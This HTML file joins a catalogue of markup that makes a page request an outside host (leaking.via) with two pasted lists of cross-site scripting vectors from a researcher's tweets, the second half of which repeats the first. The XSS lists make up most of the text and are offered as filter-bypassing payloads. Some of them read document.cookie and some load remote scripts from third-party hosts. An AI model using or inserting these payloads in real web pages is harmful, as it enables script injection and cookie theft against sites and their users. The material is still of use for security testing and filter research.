<!DOCTYPE html SYSTEM "https://leaking.via/doctype">
<html xmlns="http://www.w3.org/1999/xhtml" manifest="https://leaking.via/html-manifest">
<head>

<!--
%Base (check manually)
-->
<base href="https://leaking.via/base-href/">

<!--
%MSIE Imports
-->
<?IMPORT namespace="myNS" implementation="https://leaking.via/import-implementation" ?>
<IMPORT namespace="myNS" implementation="https://leaking.via/import-implementation-2" />

<!--
%Redirects
-->
<meta http-equiv="refresh" content="10; url=http://leaking.via/meta-refresh">

<!--  
%CSP
-->
<meta http-equiv="Content-Security-Policy" content="script-src 'self'; report-uri http://leaking.via/meta-csp-report-uri">
<meta http-equiv="Content-Security-Policy-Report-Only" content="script-src 'self'; report-uri http://leaking.via/meta-csp-report-uri-2">

<!-- 
%Reading View
-->
<meta name="copyright" content="<img src='https://leaking.via/meta-name-copyright-reading-view'>">
<meta name="displaydate" content="<img src='https://leaking.via/meta-name-displaydate-reading-view'>">
<meta property="og:site_name" content="<img src='https://leaking.via/meta-property-reading-view'>">

<!-- 
%Links 
-->
<link rel="stylesheet" href="https://leaking.via/link-stylesheet" />
<link rel="icon" href="https://leaking.via/link-icon" />
<link rel="canonical" href="https://leaking.via/link-canonical" />
<link rel="shortcut icon" href="https://leaking.via/link-shortcut-icon" />
<link rel="import" href="https://leaking.via/link-import" />
<link rel="dns-prefetch" href="https://leaking.via/link-dns-prefetch" />
<link rel="preconnect" href="https://leaking.via/link-preconnect">
<link rel="prefetch" href="https://leaking.via/link-prefetch" />
<link rel="preload" href="https://leaking.via/link-preload" />
<link rel="prerender" href="https://leaking.via/link-prerender" />

<link rel="search" href="https://leaking.via/link-search" />
<!--
Note that OpenSearch description URLs are ignored in Chrome if this file isn't placed in the webroot.
Also, in Chrome, you won't see the request in the developer tools because the request happens in the privileged browser process.
Use a network sniffer to detect it.
-->

<link rel="alternate" href="https://leaking.via/link-alternate" />
<link rel="alternate" type="application/atom+xml" href="https://leaking.via/link-alternate-atom" /> 
<link rel="alternate stylesheet" href="https://leaking.via/link-alternate-stylesheet" />
<link rel="appendix" href="https://leaking.via/link-appendix" />
<link rel="apple-touch-icon-precomposed" href="https://leaking.via/link-apple-touch-icon-precomposed">
<link rel="apple-touch-icon" href="https://leaking.via/link-apple-touch-icon">
<link rel="archives" href="https://leaking.via/link-archives" />
<link rel="author" href="https://leaking.via/link-author" />
<link rel="bookmark" href="https://leaking.via/link-bookmark" />
<link rel="chapter" href="https://leaking.via/link-chapter" />
<link rel="contents" href="https://leaking.via/link-contents" />
<link rel="copyright" href="https://leaking.via/link-copyright" />
<link rel="entry-content" href="https://leaking.via/link-entry-content" />
<link rel="external" href="https://leaking.via/link-external" />
<link rel="feedurl" href="https://leaking.via/link-feedurl" />
<link rel="first" href="https://leaking.via/link-first" />
<link rel="glossary" href="https://leaking.via/link-glossary" />
<link rel="help" href="https://leaking.via/link-help" />
<link rel="index" href="https://leaking.via/link-index" />
<link rel="last" href="https://leaking.via/link-last" />
<link rel="manifest" href="https://leaking.via/link-manifest" />
<link rel="next" href="https://leaking.via/link-next" />
<link rel="offline" href="https://leaking.via/link-offline" />
<link rel="pingback" href="https://leaking.via/link-pingback" />
<link rel="prev" href="https://leaking.via/link-prev" />
<link rel="search" type="application/opensearchdescription+xml" href="https://leaking.via/link-search-2" title="Search" /> 
<link rel="sidebar" href="https://leaking.via/link-sidebar" />
<link rel="start" href="https://leaking.via/link-start" />
<link rel="section" href="https://leaking.via/link-section" />
<link rel="subsection" href="https://leaking.via/link-subsection" />
<link rel="subresource" href="https://leaking.via/link-subresource">
<link rel="tag" href="https://leaking.via/link-tag" />
<link rel="up" href="https://leaking.via/link-up" />
</head>

<!--
%Body Background
-->
<body background="https://leaking.via/body-background">

<!-- 
%Links & Maps
-->
<a ping="http://leaking.via/a-ping" href="#">You have to click me</a>
<img src="data:;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw" width="150" height="150" usemap="#map">
<map name="map">
  <area ping="http://leaking.via/area-ping" shape="rect" coords="0,0,150,150" href="#">
</map> 
<!-- 
The ping attribute allows to send a HTTP request to an external IP or domain, 
even if the link's HREF points somewhere else. The link has to be clicked though 

https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#attr-ping
-->

<!--
%Table Background
-->
<table background="https://leaking.via/table-background">
    <tr>
        <td background="https://leaking.via/td-background"></td>
    </tr>
</table>

<!--
%Images
-->
<img src="https://leaking.via/img-src">
<img dynsrc="https://leaking.via/img-dynsrc">
<img lowsrc="https://leaking.via/img-lowsrc">
<img src="data:image/svg+xml,<svg%20xmlns='%68ttp:%2f/www.w3.org/2000/svg'%20xmlns:xlink='%68ttp:%2f/www.w3.org/1999/xlink'><image%20xlink:hr%65f='%68ttp:%2f/leaking.via/svg-via-data'></image></svg>">

<image src="https://leaking.via/image-src">
<image href="https://leaking.via/image-href">

<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<image href="https://leaking.via/svg-image-href">
<image xlink:href="https://leaking.via/svg-image-xlink-href">
</svg>

<picture>
    <source srcset="https://leaking.via/picture-source-srcset">
</picture>
<picture>
    <img srcset="https://leaking.via/picture-img-srcset">
</picture>
<img srcset=",,,,,https://leaking.via/img-srcset">

<img src="#" longdesc="https://leaking.via/img-longdesc">
<!-- longdesc works on Firefox but requires right-click, "View Description" -->

<!--
%Forms
-->
<form action="https://leaking.via/form-action"></form>
<form id="test"></form><button form="test" formaction="https://leaking.via/button-formaction">CLICKME</button>
<input type="image" src="https://leaking.via/input-src" name="test" value="test">
<isindex src="https://leaking.via/isindex" type="image">

<!--
%Media
-->
<bgsound src="https://leaking.via/bgsound-src"></bgsound>
<video src="https://leaking.via/video-src">
  <track kind="subtitles" label="English subtitles" src="https://leaking.via/track-src" srclang="en" default></track>
</video>
<video controls>
  <source src="https://leaking.via/video-source-src" type="video/mp4">
</video>
<audio controls>
  <source src="https://leaking.via/audio-source-src" type="video/mp4">
</audio>
<video poster="https://leaking.via/video-poster" src="https://leaking.via/video-poster-2"></video>

<!--
%Object & Embed
-->
<object data="https://leaking.via/object-data"></object>
<object type="text/x-scriptlet" data="https://leaking.via/object-data-x-scriptlet"></object>
<object movie="https://leaking.via/object-movie" type="application/x-shockwave-flash"></object>
<object movie="https://leaking.via/object-movie">
    <param name="type" value="application/x-shockwave-flash"></param>
</object>
<object codebase="https://leaking.via/object-codebase"></object>
<embed src="https://leaking.via/embed-src"></embed>
<embed code="https://leaking.via/embed-code"></embed>
<object classid="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83">
    <param name="DataURL" value="http://leaking.via/object-param-dataurl">
</object>


<!--
%Script
-->
<script src="https://leaking.via/script-src"></script>
<svg><script href="https://leaking.via/svg-script-href"></script></svg>
<svg><script xlink:href="https://leaking.via/svg-script-xlink-href"></script></svg>

<!--
%Frames
-->
<iframe src="https://leaking.via/iframe-src"></iframe>
<iframe src="data:image/svg+xml,<svg%20xmlns='%68ttp:%2f/www.w3.org/2000/svg'%20xmlns:xlink='%68ttp:%2f/www.w3.org/1999/xlink'><image%20xlink:hr%65f='%68ttps:%2f/leaking.via/svg-via-data'></image></svg>"></iframe>
<iframe srcdoc="<img src=https://leaking.via/iframe-srcdoc-img-src>"></iframe>
<frameset>
    <frame src="https://leaking.via/frame-src"></frame>
</frameset>
<iframe src="view-source:https://leaking.via/iframe-src-viewsource"></iframe>


<!--
%CSS
-->
<style>
    @import 'https://leaking.via/css-import-string';
    @import url(https://leaking.via/css-import-url);
</style>
<style>
    a:after {content: url(https://leaking.via/css-after-content)}
    a::after {content: url(https://leaking.via/css-after-content-2)}
    a:before {content: url(https://leaking.via/css-before-content)}
    a::before {content: url(https://leaking.via/css-before-content-2)}    
</style>
<a href="#">ABC</a>
<style>
    big {
        list-style: url(https://leaking.via/css-list-style);
        list-style-image: url(https://leaking.via/css-list-style-image);
        background: url(https://leaking.via/css-background);
        background-image: url(https://leaking.via/css-background-image);
        border-image: url(https://leaking.via/css-border-image);
        border-image-source: url(https://leaking.via/css-border-image-source);
        shape-outside: url(https://leaking.via/css-shape-outside);
        cursor: url(https://leaking.via/css-cursor), auto;
    }
</style>
<big>DEF</big>
<style>
    @font-face {
        font-family: leak;
        src: url(https://leaking.via/css-font-face-src);
    }
    big {
        font-family: leak;
    }
</style>
<big>GHI</big>
<svg>
    <style>
        circle {
            fill: url(https://leaking.via/svg-css-fill#foo);
            mask: url(https://leaking.via/svg-css-mask#foo);
            filter: url(https://leaking.via/svg-css-filter#foo);
            clip-path: url(https://leaking.via/svg-css-clip-path#foo);
        }
    </style>
    <circle r="40"></circle>
</svg>
<s foo="https://leaking.via/css-attr-notation">JKL</s>
<style>
    s {
      --leak: url(https://leaking.via/css-variables);
    }
    s {
      background: var(--leak);
    }
    s::after {
      content: attr(foo url);
    }    
    s::before {
      content: attr(notpresent, url(https://leaking.via/css-attr-fallback));
    }
</style>


<!--
%Inline CSS
-->
<b style="
        list-style: url(https://leaking.via/inline-css-list-style);
        list-style-image: url&#40;https://leaking.via/inline-css-list-style-image&#41;;
        background: url&#x28;https://leaking.via/inline-css-background&#x29;;
        background-image: url&lpar;https://leaking.via/inline-css-background-image&rpar;;
        border-image: url(https://leaking.via/inline-css-list-style-image);
        border-image-source: url(https://leaking.via/inline-css-border-image-source);
        shape-outside: url(https://leaking.via/inline-css-shape-outside);
        cursor: url(https://leaking.via/inline-css-cursor), auto;
">MNO</b>

<svg>
<circle style="
        fill: url(https://leaking.via/svg-inline-css-fill#foo);
        mask: url(https://leaking.via/svg-inline-css-mask#foo);
        filter: url(https://leaking.via/svg-inline-css-filter#foo);
        clip-path: url(https://leaking.via/svg-inline-css-clip-path#foo);
"></circle>
</svg>

<!-- 
%Exotic Inline CSS
-->
<div style="background: url() url() url() url() url(https://leaking.via/inline-css-multiple-backgrounds);"></div>
<div style="behavior: url('https://leaking.via/inline-css-behavior');"></div>
<div style="-ms-behavior: url('https://leaking.via/inline-css-behavior-2');"></div>
<div style="background-image: image('https://leaking.via/inline-css-image-function')"></div>
<div style="filter:progid:DXImageTransform.Microsoft.AlphaImageLoader( src='https://leaking.via/inline-css-filter-alpha', sizingMethod='scale');" ></div>
<div style="filter:progid:DXImageTransform.Microsoft.ICMFilter(colorSpace='https://leaking.via/inline-css-filter-icm')"></div>

<!--
%Applet
-->
<applet code="Test" codebase="https://leaking.via/applet-codebase"></applet>
<applet code="Test" archive="https://leaking.via/applet-archive"></applet>
<applet code="Test" object="https://leaking.via/applet-object"></applet>

<!--
%SVG
-->
<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <defs>
    <linearGradient id="Gradient">
      <stop offset="0" stop-color="white" stop-opacity="0" />
      <stop offset="1" stop-color="white" stop-opacity="1" />
    </linearGradient>
    <mask id="Mask">
      <rect x="0" y="0" width="200" height="200" fill="url(https://leaking.via/svg-fill)"  />
    </mask>
  </defs>
  <rect x="0" y="0" width="200" height="200" fill="green" />
  <rect x="0" y="0" width="200" height="200" fill="red" mask="url(https://leaking.via/svg-mask)" />
</svg>

<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xmlns:xlink="http://www.w3.org/1999/xlink">
        <set attributeName="xlink:href" begin="0s" to="https://leaking.via/svg-image-set" />
    </image>
</svg>

<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <image xmlns:xlink="http://www.w3.org/1999/xlink">
        <animate attributeName="xlink:href" begin="0s" from="#" to="https://leaking.via/svg-image-animate" />
    </image>
</svg>

<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <feImage xlink:href="https://leaking.via/svg-feimage" />
</svg>

<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <a xlink:href="https://leaking.via/svg-a-text/"><text transform="translate(0,20)">CLICKME</text></a>
</svg>

<!--
%XSLT Stylesheets
-->
<?xml-stylesheet type="text/xsl" href="https://leaking.via/xslt-stylesheet" ?>

<!--
%Data Islands
-->
<xml src="https://leaking.via/xml-src" id="xml"></xml>
<div datasrc="#xml" datafld="$text" dataformatas="html"></div>

<!--
%MathML
-->
<math xlink:href="https://leaking.via/mathml-math">CLICKME</math>

<math><mi xlink:href="https://leaking.via/mathml-mi">CLICKME</mi></math>

50 awesome XSS vectors that I have tweeted (@soaj1664ashar) over time. Enjoy! Now you can bypass any filter with the help of these full baked vectors :-)

1) <a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
 
2) <div onmouseover='alert&lpar;1&rpar;'>DIV</div>
 
3) <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
 
4) <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
 
5) <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ​
 
6) <object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">​
 
7) <var onmouseover="prompt(1)">On Mouse Over</var>​
 
8) <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
 
9) <img src="/" =_=" title="onerror='prompt(1)'">
 
10) <%<!--'%><script>alert(1);</script -->
 
11) <script src="data:text/javascript,alert(1)"></script>
 
12) <iframe/src \/\/onload = prompt(1)
 
13) <iframe/onreadystatechange=alert(1)
 
14) <svg/onload=alert(1)
 
15) <input value=<><iframe/src=javascript:confirm(1)
 
16) <input type="text" value=``<div/onmouseover='alert(1)'>X</div>
 
17) http://www.<script>alert(1)</script .com
 
 
18) <iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>​
 
19) <svg><script ?>alert(1)
 
20) <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
 
21) <img src=`xx:xx`onerror=alert(1)>
 
22) <object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
 
23) <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>​
 
24) <math><a xlink:href="//jsfiddle.net/t846h/">click
 
25) <embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>​
 
26) <svg contentScriptType=text/vbs><script>MsgBox+1
 
27) <a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
 
28) <iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
 
29) <script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
 
30) <script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
 
31) <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script​​​​​​​​​​​​
 
32) <object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
 
33) <script>+-+-1-+-+alert(1)</script>
 
34) <body/onload=&lt;!--&gt;&#10alert(1)>
 
35) <script itworksinallbrowsers>/*<script* */alert(1)</script ​
 
36) <img src ?itworksonchrome?\/onerror = alert(1)​​​
 
37) <svg><script>//&NewLine;confirm(1);</script </svg>
 
38) <svg><script onlypossibleinopera:-)> alert(1)
 
39) <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
 
40) <script x> alert(1) </script 1=2
 
41) <div/onmouseover='alert(1)'> style="x:">
 
42)  <--`<img/src=` onerror=alert(1)> --!>
 
43) <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>​
 
44) <div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>​
 
45) "><img src=x onerror=window.open('https://www.google.com/');>
 
46) <form><button formaction=javascript&colon;alert(1)>CLICKME
 
47) <math><a xlink:href="//jsfiddle.net/t846h/">click
 
48) <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>​
 
49) <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
 
50) <a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>​


                                      100 #XSS Vectors
                                      ----------------
                                       @soaj1664ashar

Below you will find 100 XSS vectors including 50 new XSS attack vectors. All vectors works like charm in Chrome :-) I have also specified browser name alongside in case of some vectors that do not work in Chrome. 


1) <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>

2) <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'

3) <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"

4) <sVg><scRipt %00>alert&lpar;1&rpar; {Opera}

5) <img/src=`%00` onerror=this.onerror=confirm(1) 

6) <form><isindex formaction="javascript&colon;confirm(1)"

7) <img src=`%00`&NewLine; onerror=alert(1)&NewLine;

8) <script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>

9) <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?

10) <iframe/src="data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">

11) <script /*%00*/>/*%00*/alert(1)/*%00*/</script /*%00*/

12) &#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00

13) <iframe/src="data:text/html,<svg &#111;&#110;load=alert(1)>">

14) <meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>

15) <svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script

16) <svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}

17) <meta http-equiv="refresh" content="0;url=javascript:confirm(1)">

18) <iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>

19) <form><a href="javascript:\u0061lert&#x28;1&#x29;">X

20) </script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>

21) <img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>

22) <form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>

23) <a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a

24) http://www.google<script .com>alert(document.location)</script

25) <a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a

26) <img/src=@&#32;&#13; onerror = prompt('&#49;')

27) <style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;

28) <script ^__^>alert(String.fromCharCode(49))</script ^__^

29) </style &#32;><script &#32; :-(>/**/alert(document.location)/**/</script &#32; :-(

30) &#00;</form><input type&#61;"date" onfocus="alert(1)">

31) <form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>

32) <script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/

33) <iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>

34) <a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>

35) <script ~~~>alert(0%0)</script ~~~>

36) <style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>

37) <///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN

38) <img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)

39) &#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'

40) &#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}

41) <marquee onstart='javascript:alert&#x28;1&#x29;'>^__^

42) <div/style="width:expression(confirm(1))">X</div> {IE7}

43) <iframe/%00/ src=javaSCRIPT&colon;alert(1)

44) //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//

45) /*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>

46) //|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\

47) </font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>

48) <a/href="javascript:&#13; javascript:prompt(1)"><input type="X">

49) </plaintext\></|\><plaintext/onmouseover=prompt(1)

50) </svg>''<svg><script 'AQuickBrownFoxJumpsOverTheLazyDog'>alert&#x28;1&#x29; {Opera}


I have already tweeted about the following 50 XSS vectors and so far the paste has more than 1600 hits (http://pastebin.com/mQDbu7Sm)
__________________________________________________________________________________________________________________________________________________________________________________________________________________


51) <a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
 
52) <div onmouseover='alert&lpar;1&rpar;'>DIV</div>
 
53) <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
 
54) <a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
 
55) <embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
 
56) <object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
 
57) <var onmouseover="prompt(1)">On Mouse Over</var>
 
58) <a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
 
59) <img src="/" =_=" title="onerror='prompt(1)'">
 
60) <%<!--'%><script>alert(1);</script -->
 
61) <script src="data:text/javascript,alert(1)"></script>
 
62) <iframe/src \/\/onload = prompt(1)
 
63) <iframe/onreadystatechange=alert(1)
 
64) <svg/onload=alert(1)
 
65) <input value=<><iframe/src=javascript:confirm(1)
 
66) <input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
 
67) http://www.<script>alert(1)</script .com
 
68) <iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>
 
69) <svg><script ?>alert(1)
 
70) <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
 
71) <img src=`xx:xx`onerror=alert(1)>
 
72) <object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
 
73) <meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>
 
74) <math><a xlink:href="//jsfiddle.net/t846h/">click
 
75) <embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>
 
76) <svg contentScriptType=text/vbs><script>MsgBox+1
 
77) <a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
 
78) <iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
 
79) <script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
 
80) <script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
 
81) <script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script
 
82) <object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
 
83) <script>+-+-1-+-+alert(1)</script>
 
84) <body/onload=&lt;!--&gt;&#10alert(1)>
 
85) <script itworksinallbrowsers>/*<script* */alert(1)</script
 
86) <img src ?itworksonchrome?\/onerror = alert(1)
 
87) <svg><script>//&NewLine;confirm(1);</script </svg>
 
88) <svg><script onlypossibleinopera:-)> alert(1)
 
89) <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
 
90) <script x> alert(1) </script 1=2
 
91) <div/onmouseover='alert(1)'> style="x:">
 
92)  <--`<img/src=` onerror=alert(1)> --!>
 
93) <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>
 
94) <div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>
 
95) "><img src=x onerror=window.open('https://www.google.com/');>
 
96) <form><button formaction=javascript&colon;alert(1)>CLICKME
 
97) <math><a xlink:href="//jsfiddle.net/t846h/">click
 
98) <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>
 
99) <iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
 
100) <a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
